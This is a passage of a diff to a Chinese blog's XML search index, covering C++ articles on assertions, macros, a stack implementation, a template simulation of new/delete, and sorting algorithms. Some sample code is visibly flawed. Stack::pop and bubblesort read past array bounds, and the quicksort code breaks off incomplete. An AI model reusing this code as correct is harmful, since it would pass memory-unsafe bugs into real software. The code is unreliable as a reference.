queue.push(3); queue.pop(); queue.pop(); queue.pop(); queue.push(1); queue.push(2); queue.push(3); printf(&amp;#34;/n1 : size: %d /n&amp;#34;, queue.size() ); queue.traverse(print_queue); queue.pop(); printf(&amp;#34;/n2 : size: %d /n&amp;#34;, queue.size() ); queue.traverse(print_queue); queue.push(4); printf(&amp;#34;/n3 : size: %d /n&amp;#34;, queue.size() ); queue.traverse(print_queue); queue.clear(); printf(&amp;#34;/n4 : size: %d /n&amp;#34;, queue.size() ); queue.traverse(print_queue); } </content>
     </entry>
     
      <entry>
-        <title>C&#43;&#43;技巧之断言Assert</title>
+        <title>c&#43;&#43;技巧之断言Assert</title>
         <url>http://lanlingzi.cn/post/technical/csdn/cpp_static_assert/</url>
         <categories>
           <category>技术</category>
         </categories>
         <tags>
-          <tag>cpp</tag>
+          <tag>c&#43;&#43;</tag>
         </tags>
         <content type="html"> 断言的应该是一种编程的常见技巧。我所应用的断言有两种，一种是动态断言，即大家所熟知的C标准库的assert()宏，一种是C&#43;&#43;中的静态断言，即在编译期间检查。
-动态断言： assert宏的原型定义在&amp;lt;assert.h&amp;gt;中，其作用是如果它的条件返回错误，则终止程序执行，原型定义：
+动态断言 assert宏的原型定义在&amp;lt;assert.h&amp;gt;中，其作用是如果它的条件返回错误，则终止程序执行，原型定义：
 #include &amp;lt;assert.h&amp;gt; void assert( int expression ); assert的作用是先计算表达式expression ，如果其值为假（即为0），那么它先向stderr打印一条出错信息，然后通过调用abort 来终止程序运行。
 大家要注意是，其中的表达式为假时，会终止程序运行，包括我在内经常会写错代码，断言一个指针是否为空，往往写成了 assert(!p);其实应该写成assert(p);。
 assert是运行期的判断，并且会强制终止程序，一般要求只能用于debug版本中，是为了尽可能快的发现问题。尤其在我所从事的电信软件产品中，assert是要从release版本中去掉。所以一般开发会重新定义assert宏。
-静态断言： 在新的C&#43;&#43;标准中C&#43;&#43;0x中，加了对静态断言的支持，引入了新的关键字static_assert来表示静态断言。
+静态断言 在新的C&#43;&#43;标准中C&#43;&#43;0x中，加了对静态断言的支持，引入了新的关键字static_assert来表示静态断言。
 使用静态断言，我们可以在程序的编译时期检测一些条件是否成立。但这个关键字太新了，没有几个编译器是支持的(好像VC2008支持，我用VC很少，主要是在linux下C&#43;&#43;编程)。
 于是可以使用C&#43;&#43;现有的模板特性来实现静态断言的功能。boost中也已有BOOST_STATIC_ASSERT宏的实现，有兴趣的同学可以down下来仔细研究一下，它的断言信息更丰富，下面为我的简单实现：
 // declare a tempalte class StaticAssert. template &amp;lt;bool assertion&amp;gt; struct StaticAssert; // only partial specializate parameter&amp;#39;s value is true. template &amp;lt;&amp;gt; struct StaticAssert&amp;lt;true&amp;gt; { enum { VALUE = 1 }; }; #define STATIC_ASSERT(expression) (void)StaticAssert&amp;lt;expression&amp;gt;::VALUE 原理是，先声明一个模板类，但后面仅仅偏特化参数值为true的类，而为false的类则一个未定义的类，即是一个未完整的类型,编译期间无法找到StaticAssert&amp;lt;false&amp;gt;::VALUE类型。举例如下：
@@ -4489,13 +4495,13 @@ STATIC_ASSERT(4 == sizeof(long) ); //在 32bit机上OK STATIC_ASSERT(4 == sizeof
     </entry>
     
      <entry>
-        <title>C&#43;&#43;技巧之宏Macro应用</title>
+        <title>c&#43;&#43;技巧之宏Macro应用</title>
         <url>http://lanlingzi.cn/post/technical/csdn/cpp_macro_rule/</url>
         <categories>
           <category>技术</category>
         </categories>
         <tags>
-          <tag>cpp</tag>
+          <tag>c&#43;&#43;</tag>
         </tags>
         <content type="html">   宏不要用来定义常量，因为宏变量是没有类型安全，也没有名字空间约束，会造成名字的污染。
   宏的展开是一行，所以宏中的注释不能使用//，只能使用/* */。宏的代码也不能gdb跟踪，宏中代码逻辑要尽量简单。
@@ -4510,30 +4516,28 @@ STATIC_ASSERT(4 == sizeof(long) ); //在 32bit机上OK STATIC_ASSERT(4 == sizeof
     </entry>
     
      <entry>
-        <title>[c&#43;&#43;]自己实现的stack</title>
+        <title>c&#43;&#43;实现的stack</title>
         <url>http://lanlingzi.cn/post/technical/csdn/cpp_self_impl_stack/</url>
         <categories>
           <category>技术</category>
         </categories>
         <tags>
-          <tag>cpp</tag>
+          <tag>c&#43;&#43;</tag>
         </tags>
         <content type="html"> 还是前一段时间需要任职资格考试，自己练习一下栈stack的简易实现，今天把它贴出来，暴露的接口与STL类似，没有实现iterator迭代器。实现有两种方式， 基于顺序存储与链式存储。栈的特点是“后进先出”，在数学表达式运算，编译语法分析中，程序函数调用时最为常见。
-公用的宏与异常类:
-#define NEW(var, T) do { / try { / var = new T; / }catch(...) { / var = NULL; / } / }while(0) #define DELETE(var) do { / if(NULL != var) / { / delete var; / var = NULL; / } / }while(0) template&amp;lt;typename T&amp;gt; struct Error { Error(const char* pszInfo = &amp;#34;Overflow&amp;#34;) { printf(&amp;#34;/nThrow a error, Info :%s/n&amp;#34;, pszInfo); } }; 顺序存储，模板实现，其中参数T为栈的存储类型，参数SIZE表示最大存储的个数。
-template&amp;lt;typename T, size_t SIZE&amp;gt; class Stack { public: Stack() : m_size(0) { } ~Stack() { } bool push(const T&amp;amp; t) { if (m_size == SIZE) { return false; } m_data[m_size] = t; m_size&#43;&#43;; return true; } T&amp;amp; pop() { if (0 == m_size) { throw Error&amp;lt;T&amp;gt; (&amp;#34;Overflow&amp;#34;); } else { T&amp;amp; t = m_data[m_size]; m_size--; return t; } } void clear() { m_size = 0; } const bool empty() const { return 0 == m_size; } const size_t size() const { return m_size; } // 遍历所有的节点 void traverse(void(*func)(T&amp;amp;)) { if (empty()) { return; } for (size_t idx = 0; idx &amp;lt; m_size; &#43;&#43;idx) { func(m_data[idx]); } } private: T m_data[SIZE]; size_t m_size; }; 链式存储，也是模板实现，内部结构为一单向链表。入栈的元素加到链表的表头。
-template&amp;lt;typename T&amp;gt; struct SNode { T m_data; SNode* m_pNext; SNode() : m_pNext(NULL) { } }; template&amp;lt;typename T&amp;gt; class LStack { typedef SNode&amp;lt;T&amp;gt; TNode; public: LStack() : m_size(0) { NEW(m_pTop, TNode()); if (NULL != m_pTop) { m_pTop-&amp;gt;m_pNext = NULL; } } ~LStack() { clear(); DELETE(m_pTop); } void clear() { if (NULL == m_pTop) { return; } TNode* pTemp = m_pTop-&amp;gt;m_pNext; while (NULL != pTemp) { TNode* pTemp2 = pTemp-&amp;gt;m_pNext; DELETE(pTemp); pTemp = pTemp2; } m_pTop-&amp;gt;m_pNext = NULL; m_size = 0; } const bool empty() const { return (NULL == m_pTop || NULL == m_pTop-&amp;gt;m_pNext) ? true : false; } const size_t size() const { return m_size; } bool push(const T&amp;amp; t) { if (NULL == m_pTop) { return false; } TNode* pTemp = NULL; NEW(pTemp, TNode()); if (NULL == pTemp) { return false; } pTemp-&amp;gt;m_data = t; pTemp-&amp;gt;m_pNext = m_pTop-&amp;gt;m_pNext; m_pTop-&amp;gt;m_pNext = pTemp; m_size&#43;&#43;; return true; } T pop() { TNode* pTemp = m_pTop-&amp;gt;m_pNext; if (NULL == pTemp) { throw Error&amp;lt;T&amp;gt; (&amp;#34;Overflow&amp;#34;); } T t = pTemp-&amp;gt;m_data; m_pTop-&amp;gt;m_pNext = pTemp-&amp;gt;m_pNext; DELETE(pTemp); m_size--; return t; } // 遍历所有的节点 void traverse(void(*func)(T&amp;amp;)) { if (empty()) { return; } TNode* pTemp = m_pTop-&amp;gt;m_pNext; while (NULL != pTemp) { func(pTemp-&amp;gt;m_data); pTemp = pTemp-&amp;gt;m_pNext; } } private: TNode* m_pTop; size_t m_size; }; 测试代码：
-void print_stack(int&amp;amp; a) { printf(&amp;#34;%d/t&amp;#34;, a); } void test_stack() { printf(&amp;#34;stack test /n&amp;#34;); //Stack&amp;lt;int, 4&amp;gt; stack; LStack&amp;lt;int&amp;gt; stack; stack.push(1); stack.push(2); stack.push(3); stack.pop(); stack.pop(); stack.pop(); stack.push(1); stack.push(2); stack.push(3); printf(&amp;#34;/n1 : size: %d /n&amp;#34;, stack.size()); stack.traverse(print_stack); stack.pop(); printf(&amp;#34;/n2 : size: %d /n&amp;#34;, stack.size()); stack.traverse(print_stack); stack.push(4); printf(&amp;#34;/n3 : size: %d /n&amp;#34;, stack.size()); stack.traverse(print_stack); stack.pop(); printf(&amp;#34;/n4 : size: %d /n&amp;#34;, stack.size()); stack.traverse(print_stack); stack.clear(); printf(&amp;#34;/n5 : size: %d /n&amp;#34;, stack.size()); stack.traverse(print_stack); } </content>
+公共宏与异常类 #define NEW(var, T) do { /  try { / var = new T; / } catch(...) { / var = NULL; / } / } while(0) #define DELETE(var) do { /  if(NULL != var) { / delete var; / var = NULL; / } / } while(0) template&amp;lt;typename T&amp;gt; struct Error { Error(const char* pszInfo = &amp;#34;Overflow&amp;#34;) { printf(&amp;#34;/nThrow a error, Info :%s/n&amp;#34;, pszInfo); } }; 顺序存储 顺序存储，模板实现，其中参数T为栈的存储类型，参数SIZE表示最大存储的个数。
+template&amp;lt;typename T, size_t SIZE&amp;gt; class Stack { public: Stack() : m_size(0) { } ~Stack() {} bool push(const T&amp;amp; t) { if (m_size == SIZE) { return false; } m_data[m_size] = t; m_size&#43;&#43;; return true; } T&amp;amp; pop() { if (0 == m_size) { throw Error&amp;lt;T&amp;gt; (&amp;#34;Overflow&amp;#34;); } else { T&amp;amp; t = m_data[m_size]; m_size--; return t; } } void clear() { m_size = 0; } const bool empty() const { return 0 == m_size; } const size_t size() const { return m_size; } // 遍历所有的节点  void traverse(void(*func)(T&amp;amp;)) { if (empty()) { return; } for (size_t idx = 0; idx &amp;lt; m_size; &#43;&#43;idx) { func(m_data[idx]); } } private: T m_data[SIZE]; size_t m_size; }; 链式存储 链式存储，也是模板实现，内部结构为一单向链表。入栈的元素加到链表的表头。
+template&amp;lt;typename T&amp;gt; struct SNode { T m_data; SNode* m_pNext; SNode() : m_pNext(NULL) { } }; template&amp;lt;typename T&amp;gt; class LStack { typedef SNode&amp;lt;T&amp;gt; TNode; public: LStack() : m_size(0) { NEW(m_pTop, TNode()); if (NULL != m_pTop) { m_pTop-&amp;gt;m_pNext = NULL; } } ~LStack() { clear(); DELETE(m_pTop); } void clear() { if (NULL == m_pTop) { return; } TNode* pTemp = m_pTop-&amp;gt;m_pNext; while (NULL != pTemp) { TNode* pTemp2 = pTemp-&amp;gt;m_pNext; DELETE(pTemp); pTemp = pTemp2; } m_pTop-&amp;gt;m_pNext = NULL; m_size = 0; } const bool empty() const { return (NULL == m_pTop || NULL == m_pTop-&amp;gt;m_pNext) ? true : false; } const size_t size() const { return m_size; } bool push(const T&amp;amp; t) { if (NULL == m_pTop) { return false; } TNode* pTemp = NULL; NEW(pTemp, TNode()); if (NULL == pTemp) { return false; } pTemp-&amp;gt;m_data = t; pTemp-&amp;gt;m_pNext = m_pTop-&amp;gt;m_pNext; m_pTop-&amp;gt;m_pNext = pTemp; m_size&#43;&#43;; return true; } T&amp;amp; pop() { TNode* pTemp = m_pTop-&amp;gt;m_pNext; if (NULL == pTemp) { throw Error&amp;lt;T&amp;gt; (&amp;#34;Overflow&amp;#34;); } T t = pTemp-&amp;gt;m_data; m_pTop-&amp;gt;m_pNext = pTemp-&amp;gt;m_pNext; DELETE(pTemp); m_size--; return t; } // 遍历所有的节点  void traverse(void(*func)(T&amp;amp;)) { if (empty()) { return; } TNode* pTemp = m_pTop-&amp;gt;m_pNext; while (NULL != pTemp) { func(pTemp-&amp;gt;m_data); pTemp = pTemp-&amp;gt;m_pNext; } } private: TNode* m_pTop; size_t m_size; }; 测试代码 void print_stack(int&amp;amp; a) { printf(&amp;#34;%d/t&amp;#34;, a); } void test_stack() { printf(&amp;#34;stack test /n&amp;#34;); //Stack&amp;lt;int, 4&amp;gt; stack;  LStack&amp;lt;int&amp;gt; stack; stack.push(1); stack.push(2); stack.push(3); stack.pop(); stack.pop(); stack.pop(); stack.push(1); stack.push(2); stack.push(3); printf(&amp;#34;/n1 : size: %d /n&amp;#34;, stack.size()); stack.traverse(print_stack); stack.pop(); printf(&amp;#34;/n2 : size: %d /n&amp;#34;, stack.size()); stack.traverse(print_stack); stack.push(4); printf(&amp;#34;/n3 : size: %d /n&amp;#34;, stack.size()); stack.traverse(print_stack); stack.pop(); printf(&amp;#34;/n4 : size: %d /n&amp;#34;, stack.size()); stack.traverse(print_stack); stack.clear(); printf(&amp;#34;/n5 : size: %d /n&amp;#34;, stack.size()); stack.traverse(print_stack); } </content>
     </entry>
     
      <entry>
-        <title>用C&#43;&#43;模板来展示new与delete操作符原理</title>
+        <title>用c&#43;&#43;模板来展示new与delete操作符原理</title>
         <url>http://lanlingzi.cn/post/technical/csdn/cpp_new_delete/</url>
         <categories>
           <category>技术</category>
         </categories>
         <tags>
-          <tag>cpp</tag>
+          <tag>c&#43;&#43;</tag>
         </tags>
         <content type="html"> C&#43;&#43;中的new与delete可以认为是C中的malloc与free的升级版本。new包含两部分:
  第一部分是与malloc功能相同，是从堆上面申请内存块 第二部是调用类的构造方法来初始化刚申请的内存。  delete是new的逆过程，先调用类的析构方法来反初始化，再把刚申请的内存还给堆。
@@ -4541,23 +4545,27 @@ new []与delete []是针对数组操作符，要注意是通过new []分配的�
 下面是C&#43;&#43; 中的new与delete函数原型，申请内存失败会抛出异常bad_alloc
 void* operator new(std::size_t) throw (std::bad_alloc); void* operator new[](std::size_t) throw (std::bad_alloc); void operator delete(void*) throw(); void operator delete[](void*) throw(); 使用举例:
 int* p1 = new int(); delete p2; int* p2 = new int[5]; delete [] p2; 终于到了用模板来模拟new与delete操作符，代码中有注释说明，其中对于调用类的构造方法，采用一种C&#43;&#43;标准中称作in-place construtor的方式。使用原型为T* = new(pbuff) T()，直译的话就是在pbuff这块内存构造T类，而不用再去堆上面申请内存。这种技巧大量应用在对象池的实现中，即pbuff这块内存可以挂在链表中反复地使用（这里先不展开说了）。
-/** * A simulation of c&#43;&#43; new T() &amp;amp; new T(param) operation */ struct NewObj { template &amp;lt;typename T&amp;gt; inline void operator()(T*&amp;amp; pObj) { // allocate memory form heap void * pBuff = malloc(sizeof(T)); // call constructor pObj = new (pBuff) T(); } template &amp;lt;typename T, typename P&amp;gt; inline void operator()(T*&amp;amp; pObj, const P&amp;amp; param) { // allocate memory form heap void * pBuff = malloc(sizeof(T)); // call constructor, pass one param pObj = new(pBuff) T(param); } }; /** * A simulation of c&#43;&#43; delete T operation */ struct DeleteObj { template &amp;lt;typename T&amp;gt; inline void operator()(T*&amp;amp; pObj) { if ( NULL == pObj ) { return ;} // call destructor pObj-&amp;gt;~T(); // free memory to heap free((void*)pObj); pObj = NULL; } }; /** * A simulation of c&#43;&#43; new T[N]() operation */ struct NewObjArray { template &amp;lt;typename T&amp;gt; inline void operator()(T*&amp;amp; pObj, unsigned int size) { // save the number of array elements in the beginning of the space. long * pBuff = (long *) malloc (sizeof(T) * size &#43; sizeof(long)); *((unsigned int *) pBuff) = size; pBuff&#43;&#43;; // change pointer to T type, then can use pT&#43;&#43; T * pT = (T *) pBuff; // save the pointer to the start of the array. pObj = pT; // now iterate and construct every object in place. for (unsigned int i = 0; i &amp;lt; size; i&#43;&#43;) { new((void *) pT) T(); pT&#43;&#43;; } } }; /** * A simulation of c&#43;&#43; delete [] T operation */ struct DeleteObjArray { template &amp;lt;typename T&amp;gt; inline void operator()(T*&amp;amp; pObj) { unsigned int size = *((unsigned int *) ((long *) pObj - 1)); T * pT = pObj; // call destructor on every element in the array. for (unsigned int i = 0; i &amp;lt; size; i&#43;&#43;) { pT-&amp;gt;~T(); pT&#43;&#43;; } // free memory to heap. free ((void *) ((long *) pObj - 1)); pObj = NULL; } }; 测试代码:
-struct TestClass { TestClass() : mem1(0), mem2(0) {} TestClass(int m) : mem1(m), mem2(0) {} int mem1; long mem2; }; void test_new_delete() { TestClass* p1 = NULL; NewObj()(p1); printf(&amp;#34;%p/n&amp;#34;, p1); DeleteObj()(p1); // TestClass* p2 = NULL; NewObj()(p2, 0); printf(&amp;#34;%p/n&amp;#34;, p2); DeleteObj()(p2); // TestClass* p3 = NULL; NewObjArray()(p3, 5); printf(&amp;#34;%p/n&amp;#34;, p3); DeleteObjArray()(p3); }   测试环境为eclipse&#43;cdt&#43;ubuntu&#43;gcc，注意头文件需要#include&amp;lt;new&amp;gt;，使用#include&amp;lt;stdlib.h&amp;gt;会导致编译不过，因为in-place construtor是C&#43;&#43;中的新玩意。
+/** * A simulation of c&#43;&#43; new T() &amp;amp; new T(param) operation */ struct NewObj { template &amp;lt;typename T&amp;gt; inline void operator()(T*&amp;amp; pObj) { // allocate memory form heap  void * pBuff = malloc(sizeof(T)); // call constructor  pObj = new (pBuff) T(); } template &amp;lt;typename T, typename P&amp;gt; inline void operator()(T*&amp;amp; pObj, const P&amp;amp; param) { // allocate memory form heap  void * pBuff = malloc(sizeof(T)); // call constructor, pass one param  pObj = new(pBuff) T(param); } }; /** * A simulation of c&#43;&#43; delete T operation */ struct DeleteObj { template &amp;lt;typename T&amp;gt; inline void operator()(T*&amp;amp; pObj) { if ( NULL == pObj ) { return ;} // call destructor  pObj-&amp;gt;~T(); // free memory to heap  free((void*)pObj); pObj = NULL; } }; /** * A simulation of c&#43;&#43; new T[N]() operation */ struct NewObjArray { template &amp;lt;typename T&amp;gt; inline void operator()(T*&amp;amp; pObj, unsigned int size) { // save the number of array elements in the beginning of the space.  long * pBuff = (long *) malloc (sizeof(T) * size &#43; sizeof(long)); *((unsigned int *) pBuff) = size; pBuff&#43;&#43;; // change pointer to T type, then can use pT&#43;&#43;  T * pT = (T *) pBuff; // save the pointer to the start of the array.  pObj = pT; // now iterate and construct every object in place.  for (unsigned int i = 0; i &amp;lt; size; i&#43;&#43;) { new((void *) pT) T(); pT&#43;&#43;; } } }; /** * A simulation of c&#43;&#43; delete [] T operation */ struct DeleteObjArray { template &amp;lt;typename T&amp;gt; inline void operator()(T*&amp;amp; pObj) { unsigned int size = *((unsigned int *) ((long *) pObj - 1)); T * pT = pObj; // call destructor on every element in the array.  for (unsigned int i = 0; i &amp;lt; size; i&#43;&#43;) { pT-&amp;gt;~T(); pT&#43;&#43;; } // free memory to heap.  free ((void *) ((long *) pObj - 1)); pObj = NULL; } }; 测试代码:
+struct TestClass { TestClass() : mem1(0), mem2(0) {} TestClass(int m) : mem1(m), mem2(0) {} int mem1; long mem2; }; void test_new_delete() { TestClass* p1 = NULL; NewObj()(p1); printf(&amp;#34;%p/n&amp;#34;, p1); DeleteObj()(p1); //  TestClass* p2 = NULL; NewObj()(p2, 0); printf(&amp;#34;%p/n&amp;#34;, p2); DeleteObj()(p2); //  TestClass* p3 = NULL; NewObjArray()(p3, 5); printf(&amp;#34;%p/n&amp;#34;, p3); DeleteObjArray()(p3); }   测试环境为eclipse&#43;cdt&#43;ubuntu&#43;gcc，注意头文件需要#include&amp;lt;new&amp;gt;，使用#include&amp;lt;stdlib.h&amp;gt;会导致编译不过，因为in-place construtor是C&#43;&#43;中的新玩意。
 </content>
     </entry>
     
      <entry>
-        <title>[c&#43;&#43;]常见的几个排序算法</title>
+        <title>c&#43;&#43;常见的几个排序算法</title>
         <url>http://lanlingzi.cn/post/technical/csdn/cpp_aglos/</url>
         <categories>
           <category>技术</category>
         </categories>
         <tags>
-          <tag>cpp</tag>
+          <tag>c&#43;&#43;</tag>
         </tags>
         <content type="html"> 前一段时间需要任职资格考试，于是又拿起丢了几年的数据结构书看了看，温习了一下常见的几个排序算法。今天特把我写的学习代码贴了出来。排序的算法常见有插入排序，选择排序与交换排序，较复杂一点还有归并排序与基数排序，概念性的东西我就不多说了，大家可以找一本严老师数据结构书看看。读大学时不觉得怎么样，现在再来看看，又结合这几年的编程经验，通过C&#43;&#43;风格函数子造了一遍轮子。
-排序算法  先来一个排序中的比较函数子，实现是左值小于右值。  template&amp;lt;typename T&amp;gt; struct CmpFuctor { bool operator()(const T&amp;amp; lhs, const T&amp;amp; rhs) { return lhs &amp;lt; rhs; } };  交换排序中用到的交换两个元素的函数。  template&amp;lt;typename T&amp;gt; void swap(T* lhs, T* rhs) { T tmp = *lhs; *lhs = *rhs; *rhs = tmp; }  排序前后，我们自然要观察前后元素的顺序，那也少了下面这个函数。即遍历整个数组，再回调函数指针func，把元素通过引用传递出来。  template&amp;lt;typename T&amp;gt; void traverse(T* pArray, const int size, void (*func)(T&amp;amp;) ) { for(int idx =0; idx&amp;lt; size; idx&#43;&#43;) { func(pArray[idx]); } }  我们先来看一个最简单的插入排序。  template&amp;lt;typename T, typename CMP &amp;gt; void insertsort(T* pArray, const int size, CMP cmp) { for(int idx =0; idx&amp;lt; size; idx&#43;&#43;) { T temp = pArray[idx]; int pos = idx -1; while( pos &amp;gt;= 0 &amp;amp;&amp;amp; cmp(temp, pArray[pos]) ) // &amp;lt; { pArray[pos&#43;1] = pArray[pos]; pos--; } pArray[pos&#43;1] = temp; } }  再对上面的插入排序改进，查找为折半插入排序。  template&amp;lt;typename T, typename CMP&amp;gt; void binaryinsertsort(T* pArray, const int size, CMP cmp) { for(int idx = 1; idx &amp;lt; size; idx&#43;&#43;) { int left = 0; int right = idx -1; T temp = pArray[idx]; while( left &amp;lt;= right) { int middle = (left &#43; right) / 2; if ( cmp(temp, pArray[middle] )) // &amp;lt; { right = middle - 1; } else { left = middle &#43; 1; } } int j = idx-1; for(; j &amp;gt;= right&#43;1; j--) { pArray[j&#43;1] = pArray[j]; } pArray[right&#43;1] = temp; } }  再来一个改进版的插入排序。  是希尔排序。希尔排序的基本思想是：先将整个待排记录序列分割成若干小组（子序列），分别在组内进行直接插入排序，待整个序列中的记录“基本有序”时，再对全体记录进行一次直接插入排序。
-template&amp;lt;typename T, typename CMP&amp;gt; void shellsort(T* pArray, const int size, CMP cmp) { int j = 0; int d = size / 2; // 通过增量控制排序的执行过程 while( d &amp;gt; 0 ) { for(int i = d; i&amp;lt; size;i&#43;&#43;) { j = i - d; while(j &amp;gt;= 0) { // 对各个分组进行处理 if ( cmp(pArray[j&#43;d], pArray[j]) ) { swap(&amp;amp;pArray[j], &amp;amp;pArray[j&#43;d]); j -= d; } else { j = -1; } } } d /= 2; //递减增量d } }  下面是一种简单选择排序算法。  template&amp;lt;typename T, typename CMP&amp;gt; void selectsort(T* pArray, const int size, CMP cmp) { for(int idx = 0; idx &amp;lt; size; idx&#43;&#43;) { for(int pos = idx &#43; 1; pos &amp;lt; size; pos&#43;&#43;) { if( cmp(pArray[pos], pArray[idx]) ) // &amp;lt; { swap(&amp;amp;pArray[pos], &amp;amp;pArray[idx]); } } } }  交换排序中最简单的冒泡排序。  template&amp;lt;typename T, typename CMP&amp;gt; void bubblesort(T* pArray, const int size, CMP cmp) { for(int idx =0; idx &amp;lt; size; idx&#43;&#43;) { for(int pos = 0; pos &amp;lt;= size - idx;pos&#43;&#43;) { if( cmp(pArray[pos&#43;1], pArray[pos]) ) // &amp;lt; { swap(&amp;amp;pArray[pos], &amp;amp;pArray[pos&#43;1]); } } } }  交换排序中最简单的快速排序。  template&amp;lt;typename T, typename CMP&amp;gt; int partition(T* pArray, int p, int r, CMP cmp) { int i = p - 1; int j = 0; for(j = p; j &amp;lt; r; j&#43;&#43;) { if(cmp(pArray[j], pArray[r])) //pArray[j] &amp;gt;= pArray[r] { i&#43;&#43;; swap(&amp;amp;pArray[i], &amp;amp;pArray[j]); } } swap(&amp;amp;pArray[i &#43; 1], &amp;amp;pArray[r]); return i &#43; 1; 测试代码 void print(int&amp;amp; a) { printf(&amp;#34;%d/t&amp;#34;, a); } int genrandom(int min, int max) { return (min &#43; (int)(((float)rand()/RAND_MAX)*(max - min))); } void random(int&amp;amp; a ) { a = genrandom(-50, 100); } void sort_test() { int A[] = {4, 1, 44, -12, 5, 125, 30}; int len = sizeof(A) / sizeof(int); // traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); insertsort(A, len, CmpFuctor&amp;lt;int&amp;gt;() ); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); // traverse(A, len, random); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); binaryinsertsort(A, len, CmpFuctor&amp;lt;int&amp;gt;() ); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); // traverse(A, len, random); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); shellsort(A, len, CmpFuctor&amp;lt;int&amp;gt;() ); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); // traverse(A, len, random); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); bubblesort(A, len, CmpFuctor&amp;lt;int&amp;gt;() ); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); // traverse(A, len, random); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); selectsort(A, len, CmpFuctor&amp;lt;int&amp;gt;() ); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); // traverse(A, len, random); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); quicksort(A, 0, len, CmpFuctor&amp;lt;int&amp;gt;() ); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); }   上面的函数有C风格的函数指针与C&#43;&#43;风格函数子（Functor，有时也叫函数对象），函数使用了C&#43;&#43;中模板的一些特性，测试环境为eclipse&#43;cdt&#43;gcc。
+公共函数 先来一个排序中的比较函数子，实现是左值小于右值。
+template&amp;lt;typename T&amp;gt; struct CmpFuctor { bool operator()(const T&amp;amp; lhs, const T&amp;amp; rhs) { return lhs &amp;lt; rhs; } }; 交换排序中用到的交换两个元素的函数。
+template&amp;lt;typename T&amp;gt; void swap(T* lhs, T* rhs) { T tmp = *lhs; *lhs = *rhs; *rhs = tmp; } 排序前后，我们自然要观察前后元素的顺序，那也少了下面这个函数。即遍历整个数组，再回调函数指针func，把元素通过引用传递出来。
+template&amp;lt;typename T&amp;gt; void traverse(T* pArray, const int size, void (*func)(T&amp;amp;) ) { for(int idx =0; idx&amp;lt; size; idx&#43;&#43;) { func(pArray[idx]); } } 插入排序 简单插入排序 template&amp;lt;typename T, typename CMP &amp;gt; void insertsort(T* pArray, const int size, CMP cmp) { for(int idx =0; idx&amp;lt; size; idx&#43;&#43;) { T temp = pArray[idx]; int pos = idx -1; while( pos &amp;gt;= 0 &amp;amp;&amp;amp; cmp(temp, pArray[pos]) ) { // &amp;lt;  pArray[pos&#43;1] = pArray[pos]; pos--; } pArray[pos&#43;1] = temp; } } 折半插入排序 再对上面的插入排序改进，查找为折半插入排序。
+template&amp;lt;typename T, typename CMP&amp;gt; void binaryinsertsort(T* pArray, const int size, CMP cmp) { for(int idx = 1; idx &amp;lt; size; idx&#43;&#43;) { int left = 0; int right = idx -1; T temp = pArray[idx]; while( left &amp;lt;= right) { int middle = (left &#43; right) / 2; if ( cmp(temp, pArray[middle] )) { // &amp;lt;  right = middle - 1; } else { left = middle &#43; 1; } } int j = idx-1; for(; j &amp;gt;= right&#43;1; j--) { pArray[j&#43;1] = pArray[j]; } pArray[right&#43;1] = temp; } } 希尔排序 再来一个改进版的插入排序。希尔排序的基本思想是：先将整个待排记录序列分割成若干小组（子序列），分别在组内进行直接插入排序，待整个序列中的记录“基本有序”时，再对全体记录进行一次直接插入排序。
+template&amp;lt;typename T, typename CMP&amp;gt; void shellsort(T* pArray, const int size, CMP cmp) { int j = 0; int d = size / 2; // 通过增量控制排序的执行过程  while( d &amp;gt; 0 ) { for(int i = d; i&amp;lt; size;i&#43;&#43;) { j = i - d; while(j &amp;gt;= 0) { // 对各个分组进行处理  if ( cmp(pArray[j&#43;d], pArray[j]) ) { swap(&amp;amp;pArray[j], &amp;amp;pArray[j&#43;d]); j -= d; } else { j = -1; } } } d /= 2; //递减增量d  } } 交换排序 简单交换排序 template&amp;lt;typename T, typename CMP&amp;gt; void selectsort(T* pArray, const int size, CMP cmp) { for(int idx = 0; idx &amp;lt; size; idx&#43;&#43;) { for(int pos = idx &#43; 1; pos &amp;lt; size; pos&#43;&#43;) { if( cmp(pArray[pos], pArray[idx]) ) { swap(&amp;amp;pArray[pos], &amp;amp;pArray[idx]); } } } } 冒泡排序 template&amp;lt;typename T, typename CMP&amp;gt; void bubblesort(T* pArray, const int size, CMP cmp) { for(int idx =0; idx &amp;lt; size; idx&#43;&#43;) { for(int pos = 0; pos &amp;lt;= size - idx;pos&#43;&#43;) { if( cmp(pArray[pos&#43;1], pArray[pos]) ) { swap(&amp;amp;pArray[pos], &amp;amp;pArray[pos&#43;1]); } } } } 快速排序 template&amp;lt;typename T, typename CMP&amp;gt; int partition(T* pArray, int p, int r, CMP cmp) { int i = p - 1; int j = 0; for(j = p; j &amp;lt; r; j&#43;&#43;) { if(cmp(pArray[j], pArray[r])) { i&#43;&#43;; swap(&amp;amp;pArray[i], &amp;amp;pArray[j]); } } swap(&amp;amp;pArray[i &#43; 1], &amp;amp;pArray[r]); return i &#43; 1; 测试代码 void print(int&amp;amp; a) { printf(&amp;#34;%d/t&amp;#34;, a); } int genrandom(int min, int max) { return (min &#43; (int)(((float)rand()/RAND_MAX)*(max - min))); } void random(int&amp;amp; a ) { a = genrandom(-50, 100); } void sort_test() { int A[] = {4, 1, 44, -12, 5, 125, 30}; int len = sizeof(A) / sizeof(int); //  traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); insertsort(A, len, CmpFuctor&amp;lt;int&amp;gt;() ); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); //  traverse(A, len, random); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); binaryinsertsort(A, len, CmpFuctor&amp;lt;int&amp;gt;() ); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); //  traverse(A, len, random); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); shellsort(A, len, CmpFuctor&amp;lt;int&amp;gt;() ); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); //  traverse(A, len, random); traverse(A, len, print); printf(&amp;#34;/n&amp;#34;); 